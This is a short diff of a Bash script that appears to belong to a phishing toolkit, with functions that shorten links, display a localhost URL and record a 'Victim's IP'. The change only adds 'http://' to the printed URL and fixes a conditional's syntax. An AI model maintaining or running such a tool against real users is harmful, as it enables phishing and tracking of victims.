@@ -663,7 +663,7 @@ shorten_tinyurl() {
 displaylink(){
 	clear
 	sbanner
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}${HOST}:${PORT}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
 }
 displayshortlink() {
 	displaylink
@@ -687,7 +687,7 @@ capture_ip() {
 				IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-	if [ $reply_tunnel -eq 1 || $reply_tunnel -eq 01]; then
+	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
 		echo " "
 		save_ip
